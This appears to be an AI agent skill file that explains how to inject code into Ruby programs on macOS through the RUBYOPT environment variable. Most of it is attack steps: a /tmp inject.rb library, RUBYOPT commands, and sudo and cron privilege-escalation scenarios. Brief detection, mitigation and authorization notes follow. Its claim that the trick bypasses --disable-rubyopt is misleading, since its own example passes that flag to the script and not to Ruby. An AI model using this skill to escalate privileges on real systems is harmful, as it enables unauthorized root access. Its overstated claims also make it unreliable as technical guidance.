---
name: macos-ruby-injection
description: How to exploit RUBYOPT environment variable to inject code into Ruby applications on macOS. Use this skill whenever you need to perform privilege escalation on macOS systems running Ruby applications, or when analyzing Ruby-based vulnerabilities during security assessments. This technique works even when --disable-rubyopt is specified.
---

# macOS Ruby Applications Injection

## Overview

This skill covers exploiting the `RUBYOPT` environment variable to inject arbitrary code into Ruby applications on macOS systems. This is a privilege escalation technique that can be used during authorized security assessments.

## Prerequisites

- Target system must be running Ruby
- You must have write access to a directory (e.g., `/tmp`)
- You must be able to set environment variables for the Ruby process

## Technique

The `RUBYOPT` environment variable allows you to add parameters to Ruby whenever it executes. While the `-e` flag cannot be used directly, you can use `-I` (to add a library path) and `-r` (to require/load a library) to inject code.

### Step 1: Create the injection library

Create a Ruby file in a writable directory (e.g., `/tmp`):

```ruby:inject.rb
puts `whoami`
```

This library will execute when loaded. You can replace the `whoami` command with any command you want to execute.

### Step 2: Create or identify a target Ruby script

You need a Ruby script to target. This could be:
- A script you control
- A system script that runs with elevated privileges
- Any Ruby application on the target system

```ruby:hello.rb
puts 'Hello, World!'
```

### Step 3: Execute with RUBYOPT injection

Set the `RUBYOPT` environment variable to load your injection library:

```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb
```

This will:
1. Add `/tmp` to the library search path (`-I/tmp`)
2. Load and execute `inject.rb` (`-rinject`)
3. Then run the target script

### Important Note

This technique works even when the `--disable-rubyopt` flag is specified:

```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb --disable-rubyopt
```

## Use Cases

- **Privilege escalation**: If a Ruby script runs with elevated privileges (e.g., via sudo), you can inject code to execute commands with those privileges
- **Security assessments**: Test Ruby application security during authorized penetration testing
- **Vulnerability analysis**: Understand how environment variable injection affects Ruby applications

## Example Scenarios

### Scenario 1: Sudo Ruby Script

If a user has sudo access to run a Ruby script:

```bash
# Check what Ruby scripts can be run with sudo
sudo -l | grep ruby

# If you find one, create your injection
sudo -u root RUBYOPT="-I/tmp -rinject" /path/to/ruby/script.rb
```

### Scenario 2: Cron Job

If a Ruby script runs via cron with elevated privileges:

```bash
# Create your injection library
echo 'puts `whoami`' > /tmp/inject.rb

# Modify the cron environment or wrapper to include RUBYOPT
```

## Detection and Mitigation

### Detection
- Monitor for unexpected `RUBYOPT` environment variables
- Audit Ruby scripts that run with elevated privileges
- Check for suspicious files in `/tmp` or other writable directories

### Mitigation
- Remove unnecessary sudo access to Ruby scripts
- Use `sudo` with `--preserve-env` carefully
- Implement proper input validation in Ruby applications
- Regular security audits of privileged scripts

## Legal and Ethical Considerations

⚠️ **IMPORTANT**: This technique should only be used:
- On systems you own or have explicit written authorization to test
- During authorized security assessments
- For educational purposes in controlled environments

Unauthorized use of this technique may violate computer crime laws and could result in legal consequences.
